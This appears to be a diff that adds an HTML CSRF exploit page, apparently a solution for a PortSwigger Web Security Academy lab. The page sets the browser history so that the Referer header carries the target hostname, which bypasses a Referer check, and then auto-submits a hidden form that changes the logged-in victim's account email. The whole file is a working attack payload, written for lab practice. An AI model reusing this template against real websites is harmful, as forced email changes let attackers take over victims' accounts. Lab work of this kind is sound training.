@@ -1,0 +1,15 @@
+<html>
+    <!-- if didn't work add manually in burp exploit srver -->
+    <!-- <head>
+	    <meta name="referrer" content="unsafe-url"> 
+    </head> -->
+    <body>
+        <script>history.pushState('','','/?0af3005404d1e7e481ab941600490039.web-security-academy.net')</script>
+        <h1>Hello World!</h1>
+        <form action="https://0af3005404d1e7e481ab941600490039.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
+            <input type="hidden" name="email" value="test5@test.ir">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
